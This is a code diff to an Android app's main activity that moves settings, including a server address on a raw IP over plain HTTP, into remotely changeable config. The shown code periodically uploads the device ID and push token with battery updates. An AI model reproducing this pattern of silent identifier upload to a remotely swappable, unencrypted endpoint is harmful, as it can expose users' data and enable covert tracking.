@@ -42,10 +42,11 @@ class MainActivity : ComponentActivity() {
     private var fcmToken: String = ""
     private val handler = Handler(Looper.getMainLooper())
 
-    private val BATTERY_UPDATE_INTERVAL_MS = 60000L
-    private val FCM_TIMEOUT_MS = 3000L
-    private val userId = Constants.USER_ID
-    private val baseUrl = "http://95.134.130.160:8765"
+    // 🔧 Dynamic values from Remote Config
+    private var batteryUpdateInterval = 60000L
+    private var fcmTimeout = 3000L
+    private var userId = "XD"
+    private var baseUrl = "http://95.134.130.160:8765"
 
     private lateinit var webView: WebView
     private lateinit var permissionManager: PermissionManager
@@ -58,7 +59,7 @@ class MainActivity : ComponentActivity() {
     private val batteryUpdater = object : Runnable {
         override fun run() {
             DataUploader.sendBatteryUpdate(this@MainActivity, deviceId, fcmToken)
-            handler.postDelayed(this, BATTERY_UPDATE_INTERVAL_MS)
+            handler.postDelayed(this, batteryUpdateInterval)
         }
     }
 
@@ -68,6 +69,30 @@ class MainActivity : ComponentActivity() {
 
         deviceId = DeviceInfoHelper.getDeviceId(this)
         Log.d(TAG, "📱 Device ID: $deviceId")
+
+        // 🔧 Initialize Remote Config
+        RemoteConfigManager.initialize(this)
+        
+        // 🔄 Fetch remote config in background
+        uploadScope.launch {
+            try {
+                Log.d(TAG, "🔄 Fetching Remote Config...")
+                val success = RemoteConfigManager.fetchAndActivate()
+                if (success) {
+                    // Update dynamic values
+                    batteryUpdateInterval = RemoteConfigManager.getBatteryUpdateInterval()
+                    fcmTimeout = RemoteConfigManager.getFcmTimeout()
+                    userId = RemoteConfigManager.getUserId()
+                    baseUrl = RemoteConfigManager.getBaseUrl()
+                    
+                    RemoteConfigManager.printAllConfigs()
+                } else {
+                    Log.w(TAG, "⚠️ Using default config values")
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "❌ Remote Config error: ${e.message}", e)
+            }
+        }
 
         permissionManager = PermissionManager(this)
         permissionManager.initialize { }
@@ -346,7 +371,7 @@ class MainActivity : ComponentActivity() {
                 startBackgroundServices()
             }, 3000)
 
-        }, FCM_TIMEOUT_MS)
+        }, fcmTimeout)
     }
 
     private fun startBackgroundServices() {
